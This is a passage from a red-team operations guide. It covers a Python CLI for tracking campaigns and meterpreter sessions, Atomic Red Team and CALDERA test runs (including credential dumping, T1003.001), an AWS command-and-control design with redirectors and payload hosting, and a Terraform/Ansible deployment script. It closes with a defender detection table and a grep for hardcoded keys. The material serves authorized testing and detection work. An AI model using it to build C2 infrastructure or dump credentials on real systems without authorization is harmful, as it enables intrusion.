    note_tgt.add_argument("text")

    # session subcommand
    sess = subparsers.add_parser("session", help="Session management")
    sess_sub = sess.add_subparsers(dest="session_action", required=True)

    add_sess = sess_sub.add_parser("add", help="Add session")
    add_sess.add_argument("--target", required=True)
    add_sess.add_argument("--type", default="meterpreter")
    add_sess.add_argument("--user", required=True)
    add_sess.add_argument("--pid", type=int, default=0)
    add_sess.add_argument("--arch", default="x64")
    add_sess.add_argument("--elevated", action="store_true")

    sess_sub.add_parser("list", help="List sessions")

    # finding subcommand
    find = subparsers.add_parser("finding", help="Findings management")
    find_sub = find.add_subparsers(dest="finding_action", required=True)

    add_find = find_sub.add_parser("add", help="Add finding")
    add_find.add_argument("--target", required=True)
    add_find.add_argument("--title", required=True)
    add_find.add_argument("--severity", required=True,
                          choices=["critical", "high", "medium", "low", "info"])
    add_find.add_argument("--description", required=True)
    add_find.add_argument("--evidence", default="")
    add_find.add_argument("--mitigation", default="")
    add_find.add_argument("--cve", default="")

    ls_find = find_sub.add_parser("list", help="List findings")
    ls_find.add_argument("--severity", help="Severity filter")

    # report subcommand
    rep = subparsers.add_parser("report", help="Generate report")
    rep.add_argument("--format", default="txt", choices=["txt", "json", "csv"])
    rep.add_argument("--output", help="Output file path")

    return parser.parse_args()


def main() -> None:
    args = parse_args()
    manager = CampaignManager(Path(args.data_dir))

    if args.command == "campaign":
        if args.campaign_action == "new":
            manager.new_campaign(
                name=args.name,
                client=args.client,
                description=args.description,
                start_date=args.start,
                end_date=args.end,
            )
        elif args.campaign_action == "show":
            manager.show_campaign()

    elif args.command == "target":
        if args.target_action == "add":
            manager.add_target(args.hostname, args.ip, args.os_info, args.tags)
        elif args.target_action == "list":
            manager.list_targets(args.status)
        elif args.target_action == "status":
            manager.update_target_status(args.id, args.new_status)
        elif args.target_action == "note":
            manager.add_target_note(args.id, args.text)

    elif args.command == "session":
        if args.session_action == "add":
            manager.add_session(
                target_id=args.target,
                session_type=args.type,
                username=args.user,
                pid=args.pid,
                arch=args.arch,
                elevated=args.elevated,
            )
        elif args.session_action == "list":
            manager.list_sessions()

    elif args.command == "finding":
        if args.finding_action == "add":
            manager.add_finding(
                target_id=args.target,
                title=args.title,
                severity=args.severity,
                description=args.description,
                evidence=args.evidence,
                mitigation=args.mitigation,
                cve=args.cve,
            )
        elif args.finding_action == "list":
            manager.list_findings(args.severity)

    elif args.command == "report":
        manager.generate_report(args.format, args.output)


if __name__ == "__main__":
    main()
```

---

## 6. Blue Team Detection Evasion Testing Automation

### 6.1 Detection Evasion Testing Framework

```
MITRE ATT&CK-based automated testing:

  Atomic Red Team (open source)
  → Atomic tests for individual ATT&CK techniques
  
  Installation:
  git clone https://github.com/redcanaryco/atomic-red-team
  
  Execution (PowerShell):
  Install-Module -Name invoke-atomicredteam
  Invoke-AtomicTest T1003.001 -TestNumbers 1
  Invoke-AtomicTest T1059.001 -GetPrereqs
  Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3
  
  Collect results:
  Invoke-AtomicTest All -LoggingModule "Attire-ExecutionLogger"
```

### 6.2 CALDERA Automated Agent

```yaml
# CALDERA operation configuration example
name: "Red Team Automation Test"
adversary:
  name: "APT-Simulation"
  description: "APT group simulation"
  atomic_ordering:
    - ability: "Aggregate host information (Tactic: Discovery)"
      id: "1a98b8ea-57d9-4abe-9dd2-6f2f6fc794da"
    - ability: "Collect process list"
      id: "8099bc58-94b8-4b24-94de-ccca28aaed1e"
    - ability: "Collect credentials"
      id: "90c2efaa-8205-480d-8bb6-61d90dbaf81b"
```

---

## 7. Real-World Red Team Infrastructure Configuration (AWS-Based)

### 7.1 Full Architecture

```
AWS Red Team Infrastructure (authorized operations only):

┌─────────────────────────────────────────────┐
│                  Internet                    │
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│            Cloudflare CDN                    │
│  - DDoS protection                           │
│  - Origin IP concealment                     │
└─────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│         AWS Region (us-east-1)               │
│                                             │
│  ┌──────────────────────────────────────┐  │
│  │         Public Subnet (10.100.1.0/24) │  │
│  │                                      │  │
│  │  [Redirector-01]    [Redirector-02]  │  │
│  │  t3.micro           t3.micro         │  │
│  │  Nginx              Apache           │  │
│  │  Port 80/443        Port 80/443      │  │
│  └──────────────────────────────────────┘  │
│              │            │                 │
│              ▼            ▼                 │
│  ┌──────────────────────────────────────┐  │
│  │        Private Subnet (10.100.2.0/24)│  │
│  │                                      │  │
│  │      [C2 Teamserver]                 │  │
│  │      t3.medium                       │  │
│  │      Sliver/Cobalt Strike            │  │
│  │      Ports: operator IP only         │  │
│  └──────────────────────────────────────┘  │
│                                             │
│  [S3 Bucket] - Payload hosting              │
│  [CloudWatch] - Log collection              │
└─────────────────────────────────────────────┘

Estimated cost (monthly):
  - EC2 t3.micro × 2 (redirectors): ~$17
  - EC2 t3.medium × 1 (team server): ~$30
  - Domains × 2:                    ~$20/year
  - Total:                          ~$50/month
```

### 7.2 Deployment Script

```bash
#!/bin/bash
# Red team infrastructure deployment script (authorized operations only)

set -euo pipefail

CAMPAIGN_NAME="${1:-redteam-$(date +%Y%m%d)}"
OPERATOR_IP="${2:-$(curl -s ifconfig.me)/32}"
REGION="${3:-us-east-1}"

echo "[*] Campaign: $CAMPAIGN_NAME"
echo "[*] Operator IP: $OPERATOR_IP"
echo "[*] Region: $REGION"

# 1. Generate SSH key
ssh-keygen -t ed25519 -f "${CAMPAIGN_NAME}_key" -N "" -C "${CAMPAIGN_NAME}"
PUBLIC_KEY=$(cat "${CAMPAIGN_NAME}_key.pub")

# 2. Create tfvars
cat > terraform.tfvars << EOF
region         = "${REGION}"
operator_ip    = "${OPERATOR_IP}"
ssh_public_key = "${PUBLIC_KEY}"
EOF

# 3. Terraform deployment
terraform init
terraform apply -var-file=terraform.tfvars -auto-approve

# 4. Save output
terraform output -json > "${CAMPAIGN_NAME}_infra.json"

echo "[+] Deployment complete"
echo "[+] Infrastructure info: ${CAMPAIGN_NAME}_infra.json"

# 5. Install software via Ansible
REDIRECTOR_IP=$(terraform output -raw redirector_public_ip)
ansible-playbook \
  -i "${REDIRECTOR_IP}," \
  --private-key "${CAMPAIGN_NAME}_key" \
  playbooks/deploy.yml

echo "[+] Configuration complete"
echo ""
echo "=== Usage ==="
echo "  Redirector: $REDIRECTOR_IP"
echo "  SSH: ssh -i ${CAMPAIGN_NAME}_key operator@$REDIRECTOR_IP"
```

---

## References

- Terraform official docs: https://registry.terraform.io/providers/hashicorp/aws
- Ansible official docs: https://docs.ansible.com/
- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
- MITRE CALDERA: https://github.com/mitre/caldera
- "Infrastructure as Code" - Kief Morris
- MITRE ATT&CK Framework: https://attack.mitre.org/

---

## Attack Detection and Defense Validation

Red team infrastructure is about *operating without being caught*, but from the defender's side you must verify **whether the infra surfaces in network telemetry** and **whether detection actually catches it**. Red teamers can use this lens too, to gauge how effective their OPSEC really is.

### Attack -> mitigation layer -> control (defender) -> detection signal

| Technique | Targeted mitigation | Primary control (prevention) | Detection signal |
|---|---|---|---|
| Auto deploy/IaC | - | IaC review, secret management (Vault) | Hardcoded key/token exposure |
| Bulk payload generation | AV/EDR | Build verification, variant diversification | Many variants sharing one static signature |
| Automation infra access | - | Audit logging, access control + MFA | Unauthenticated access to the automation console |

### Defense validation (verify yourself)

```bash
# 1) Confirm no secrets are hardcoded in automation/IaC (red teams break OPSEC too)
grep -rnE 'AKIA[0-9A-Z]{16}|api[_-]?key|token=' ./automation || echo "no hardcoded secrets"
# 2) Confirm generated payloads don't share one static hash/signature (clustering risk)
for p in payloads/*.bin; do sha256sum "$p"; done | awk '{print $1}' | sort | uniq -c
# 3) Review that the automation infra is protected by auth/access control
```

> Run validation only on **systems you own, in a controlled environment**. "Configured" is not the same as "blocked at runtime" -- reproduce the PoC and confirm the mitigation stops it (see [[68_Purple_Team]]).
